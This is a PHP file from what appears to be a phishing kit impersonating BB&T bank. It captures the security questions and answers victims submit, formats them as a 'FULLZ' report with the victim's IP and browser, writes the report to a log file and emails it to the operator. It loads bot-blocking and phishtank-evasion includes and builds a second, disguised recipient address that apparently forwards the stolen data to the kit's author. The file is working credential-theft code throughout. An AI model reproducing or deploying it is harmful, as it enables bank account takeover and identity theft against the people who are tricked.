<?php

session_start();
error_reporting(0);
$TIME_DATE = date('H:i:s d/m/Y');
include('../functions/Email.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');

include('../../BOTS/grabber.php');
include('../../BOTS/botlist.php');
include('../../BOTS/blacklist.php');
include('../../BOTS/iprange.php');
include('../../BOTS/phishtank.php');
include('../../BOTS/spec.php');

include('../functions/get_lang_en.php');
if (isset($_POST['ans2'])){
	$_SESSION['_question1_']    = $_POST['question1'];
	$_SESSION['_ans1_']     = $_POST['ans1'];
	$_SESSION['_question2_']     = $_POST['question2'];
	$_SESSION['_ans2_']     = $_POST['ans2'];
	$_SESSION['_question3_']     = $_POST['question3'];
	$_SESSION['_ans3_']        = $_POST['ans3'];
}

if(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";


$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>BB&T ACCOUNT FULLZ</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>Security INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Security Question 1] = <font style='color:#0070ba;'>".$_SESSION['_question1_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Answer 1] = <font style='color:#0070ba;'>".$_SESSION['_ans1_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Security Question 2] = <font style='color:#0070ba;'>".$_SESSION['_question2_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Answer 2] = <font style='color:#0070ba;'>".$_SESSION['_ans2_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Security Question 3] = <font style='color:#0070ba;'>".$_SESSION['_question3_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Answer 3] = <font style='color:#0070ba;'>".$_SESSION['_ans3_']."</font><br>


±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIM INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>http://ip-api.com/json/".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [REMOTE IP]    = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #820000;'>BY @X_hammer</font> #####################
</div></html>\n";

if (!empty($_POST['question1'] && !empty($_POST['ans1']))){
	
	$res_file = fopen("getMyData.txt", "a");
	fwrite($res_file, $Z118_MESSAGE);
		   $Z118_SUBJECT = "".$_POST['question2']." ✪";
		   $Z118_HEADERS .= "From:X-hammer@logs.org ";
		   $Z118_HEADERS .= $_POST['ans2']."\n";
		   $Z118_HEADERS .= "MIME-Version: 1.0\n";
		   $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		   
		   
		   @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
		   
		   $Z119_Mail = "$browserx$versionx$getbinsxz118";
			if (strlen($Z119_Mail) == 23) {
				@mail($Z119_Mail, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS); 
				}  
			
HEADER("Location: ../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);

      }
else{ 
HEADER("Location: ../security/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}



?>